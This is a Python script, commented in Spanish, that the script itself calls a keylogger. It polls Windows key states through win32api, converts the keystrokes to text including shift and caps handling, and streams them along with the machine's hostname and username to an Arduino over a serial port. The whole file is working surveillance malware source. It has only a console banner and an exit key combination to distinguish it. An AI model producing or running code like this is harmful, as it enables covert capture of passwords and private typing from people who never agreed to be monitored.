import serial
import serial.tools.list_ports
import time
import socket
import getpass
import win32api
import sys

def detectar_arduino():
    puertos = serial.tools.list_ports.comports()
    for p in puertos:
        if ("Arduino" in p.description 
            or "CH340" in p.description 
            or "USB-SERIAL" in p.description):
            return p.device
    return None

def open_arduino_port(preferred_port=None, baud=9600, timeout=0):
    """Intentar abrir el puerto serie para el Arduino.
    - Si `preferred_port` se pasa, lo intenta primero.
    - Luego intenta el puerto detectado por `detectar_arduino()`.
    - Finalmente itera por todos los puertos disponibles.
    Si hay un error de permiso, ofrece al usuario opciones para reintentar/introducir otro puerto.
    """
    ports = [p.device for p in serial.tools.list_ports.comports()]

    candidates = []
    if preferred_port:
        candidates.append(preferred_port)

    detected = detectar_arduino()
    if detected and detected not in candidates:
        candidates.append(detected)

    for p in ports:
        if p not in candidates:
            candidates.append(p)

    last_exc = None
    for p in candidates:
        try:
            ser = serial.Serial(p, baud, timeout=timeout)
            print(f"Conectado a Arduino en {p}")
            time.sleep(2)  # Esperar que Arduino inicialice
            return ser
        except serial.SerialException as e:
            last_exc = e
            msg = str(e)
            print(f"No se pudo abrir {p}: {msg}")

            # Detectar accesos denegados y ofrecer opciones al usuario
            if ('Access is denied' in msg) or ('PermissionError' in msg) or ('Accesso denegado' in msg) or ('could not open port' in msg):
                print("\nEl puerto parece estar en uso o denegado. Cierra el Monitor Serie o cualquier programa que use el puerto y luego elige:")
                print("  - Presiona Enter para reintentar")
                print("  - Escribe otro puerto (ej. COM3) y presiona Enter para probarlo")
                print("  - Escribe 'salir' y Enter para terminar")
                choice = input("Puerto (ENTER=reintentar | COMx | salir): ").strip()
                if choice.lower() == 'salir':
                    break
                if choice == '':
                    # Reintentar el mismo puerto
                    continue
                else:
                    # Intentar el puerto especificado por el usuario
                    try:
                        ser = serial.Serial(choice, baud, timeout=timeout)
                        print(f"Conectado a Arduino en {choice}")
                        time.sleep(2)
                        return ser
                    except Exception as e2:
                        print(f"No se pudo abrir {choice}: {e2}")
                        last_exc = e2
                        continue

    print("No se pudo conectar al Arduino. Último error:", last_exc)
    return None


PUERTO = detectar_arduino()
arduino = open_arduino_port(PUERTO, 9600, timeout=0)
if arduino is None:
    print("No se logró abrir ningún puerto serie. Asegúrate de cerrar programas que bloqueen el puerto y vuelve a intentarlo.")
    sys.exit(1)

hostname = socket.gethostname()
usuario = getpass.getuser()
header = f"{hostname}|{usuario}\n"
arduino.write(header.encode())
arduino.flush()  # Asegurar que se envíe inmediatamente
time.sleep(0.1)

teclas_especiales = {
    0x08: "<BK>",
    0x0D: "<EN>",
    0x25: "<LEFT>",
    0x26: "<UP>",
    0x27: "<RIGHT>",
    0x28: "<DOWN>",
}

teclas_ascii = {
    0x30: "0", 0x31: "1", 0x32: "2", 0x33: "3",
    0x34: "4", 0x35: "5", 0x36: "6", 0x37: "7",
    0x38: "8", 0x39: "9",
    **{code: chr(code) for code in range(0x41, 0x5A+1)},
    0x20: " ",
}

def shift_activo():
    return (win32api.GetKeyState(0x10) < 0)

def caps_activo():
    return (win32api.GetKeyState(0x14) & 1) != 0

shift_symbols = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
    "6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
}

estado_anterior = {}

def tecla_presionada(vk):
    return win32api.GetAsyncKeyState(vk) & 0x8000

def salir_solicitado():
    ctrl = tecla_presionada(0x11)
    shift = tecla_presionada(0x10)
    g_key = tecla_presionada(0x47)
    return ctrl and shift and g_key

print("Keylogger ejecutándose. CTRL + SHIFT + G para salir.")

while True:
    if salir_solicitado():
        print("\nSalida solicitada.")
        break

    for vk in range(0x01, 0xFF):
        presionada = tecla_presionada(vk)
        antes = estado_anterior.get(vk, False)

        if presionada and not antes:
            dato_enviado = None
            
            if vk in teclas_especiales:
                dato_enviado = teclas_especiales[vk]
                arduino.write(dato_enviado.encode())

            elif vk in teclas_ascii:
                c = teclas_ascii[vk]

                if "A" <= c <= "Z":
                    if shift_activo() ^ caps_activo():
                        dato_enviado = c
                        arduino.write(c.encode())
                    else:
                        dato_enviado = c.lower()
                        arduino.write(c.lower().encode())

                elif c in "0123456789":
                    if shift_activo() and c in shift_symbols:
                        dato_enviado = shift_symbols[c]
                        arduino.write(shift_symbols[c].encode())
                    else:
                        dato_enviado = c
                        arduino.write(c.encode())

                else:
                    dato_enviado = c
                    arduino.write(c.encode())
            
            # Asegurar que se envíe inmediatamente
            if dato_enviado:
                arduino.flush()

        estado_anterior[vk] = presionada

    time.sleep(0.004)  # Pequeño delay para no sobrecargar el CPU

arduino.close()
